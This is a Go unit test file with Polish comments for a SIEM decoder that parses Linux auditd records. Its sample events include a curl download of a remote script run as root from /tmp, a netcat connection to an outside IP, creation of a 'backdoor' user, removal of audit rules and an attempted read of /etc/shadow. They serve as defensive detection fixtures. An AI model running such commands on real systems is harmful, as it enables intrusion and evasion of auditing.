// SPDX-License-Identifier: AGPL-3.0-or-later

package decode

import (
	"testing"
	"time"

	"siem/internal/contract"
)

// Zdarzenia auditd z agenta Linux (rekordy zgrupowane, źródło file:auditd).
func TestAudit(t *testing.T) {
	set := builtinSet(t)
	ev := func(i int) map[string]string {
		t.Helper()
		e, err := Event(contract.Event{ID: "a:auditd:k:1", Source: "file:auditd", Raw: builtin(t, "linux-audit", i)}, "a", ingested, set, warsaw)
		if err != nil {
			t.Fatal(err)
		}
		if e.Dataset != "linux.audit" || e.HostName != "web01" {
			t.Fatalf("próbka %d: %+v", i, e)
		}
		f := e.Fields
		f["@action"], f["@outcome"], f["@user"], f["@ip"], f["@cmd"], f["@proc"], f["@msg"] = e.Action, e.Outcome, e.UserName, e.SourceIP, e.CommandLine, e.ProcessName, e.Message
		f["@time"] = e.Timestamp.Format(time.RFC3339Nano)
		return f
	}
	x := ev(0)
	if x["@action"] != "process-start" || x["@outcome"] != "success" || x["@user"] != "jan" || x["@cmd"] != "curl -s http://203.0.113.5/x.sh" ||
		x["@proc"] != "curl" || x["type"] != "EXECVE" || x["key"] != "vardr_exec" || x["a0"] != "curl" || x["a2"] != "http://203.0.113.5/x.sh" ||
		x["file.path"] != "/usr/bin/curl" || x["cwd"] != "/tmp" || x["UID"] != "root" || x["SYSCALL"] != "execve" ||
		x["audit.types"] != "SYSCALL,EXECVE,CWD,PATH,PROCTITLE,EOE" || x["@time"] != "2026-10-29T10:00:00.123Z" {
		t.Fatalf("EXECVE: %v", x)
	}
	l := ev(1)
	if l["@action"] != "login" || l["@outcome"] != "failure" || l["@user"] != "root" || l["@ip"] != "203.0.113.9" || l["terminal"] != "ssh" || l["exe"] != "/usr/sbin/sshd" {
		t.Fatalf("USER_LOGIN: %v", l)
	}
	u := ev(2)
	if u["@action"] != "user-created" || u["target_user"] != "backdoor" || u["@user"] != "jan" || u["@outcome"] != "success" || u["id"] != "1002" {
		t.Fatalf("ADD_USER: %v", u)
	}
	c := ev(3)
	if c["@action"] != "audit-config-change" || c["op"] != "remove_rule" || c["key"] != "vardr_identity" || c["@user"] != "jan" || c["@outcome"] != "success" {
		t.Fatalf("CONFIG_CHANGE: %v", c)
	}
}

func TestAuditFormats(t *testing.T) {
	f := map[string]string{}
	// Format RAW (bez tłumaczeń), wartości w hex, połączenie (SOCKADDR), długi argument.
	err := parseAudit("type=SYSCALL msg=audit(1793268000.5:9): arch=c000003e syscall=42 success=no exit=-111 auid=1001 uid=1001 comm=6E632074657374 exe=\"/usr/bin/nc\" key=(null)\n"+
		"type=SOCKADDR msg=audit(1793268000.5:9): saddr=02001F90CB0071050000000000000000\n"+
		"type=PROCTITLE msg=audit(1793268000.5:9): proctitle=6E63003230332E302E3131332E35003830383000", f)
	if err != nil {
		t.Fatal(err)
	}
	if f["comm"] != "nc test" || f["user"] != "1001" || f["outcome"] != "failure" || f["action"] != "syscall" || f["dest_ip"] != "203.0.113.5" ||
		f["dest_port"] != "8080" || f["cmdline"] != "nc 203.0.113.5 8080" || f["key"] != "" || f["audit.ms"] != "1793268000500" {
		t.Fatalf("raw: %v", f)
	}
	g := map[string]string{}
	_ = parseAudit("type=EXECVE msg=audit(1793268000.000:10): argc=2 a0=\"bash\" a1_len=6 a1[0]=\"ab\" a1[1]=\"cdef\"", g)
	if g["cmdline"] != "bash abcdef" {
		t.Fatalf("długi argument: %q", g["cmdline"])
	}
	a := map[string]string{}
	_ = parseAudit(`type=AVC msg=audit(1793268000.000:11): apparmor="DENIED" operation="open" profile="/usr/sbin/cupsd" name="/etc/shadow" pid=1 comm="cupsd" requested_mask="r" denied_mask="r"`, a)
	if a["action"] != "access-denied" || a["outcome"] != "failure" || a["name"] != "/etc/shadow" {
		t.Fatalf("AVC: %v", a)
	}
	// Zmiana reguł przez auditctl: CONFIG_CHANGE razem z SYSCALL (sendto).
	c := map[string]string{}
	_ = parseAudit("type=CONFIG_CHANGE msg=audit(1793211680.575:4600): auid=1000 ses=3 subj=unconfined op=remove_rule key=\"vardr_exec\" list=4 res=1\x1dAUID=\"siem\"\n"+
		"type=SYSCALL msg=audit(1793211680.575:4600): arch=c000003e syscall=44 success=yes exit=1080 auid=1000 uid=0 comm=\"auditctl\" exe=\"/usr/sbin/auditctl\" key=(null)\x1dSYSCALL=sendto AUID=\"siem\"\n"+
		"type=SOCKADDR msg=audit(1793211680.575:4600): saddr=100000000000000000000000\n"+
		"type=PROCTITLE msg=audit(1793211680.575:4600): proctitle=617564697463746C002D52", c)
	if c["type"] != "CONFIG_CHANGE" || c["action"] != "audit-config-change" || c["op"] != "remove_rule" || c["outcome"] != "success" || c["user"] != "siem" || c["key"] != "vardr_exec" {
		t.Fatalf("CONFIG_CHANGE z SYSCALL: %v", c)
	}
	if parseAudit("to nie jest auditd", map[string]string{}) == nil {
		t.Fatal("tekst bez rekordu auditd musi dać błąd")
	}
}
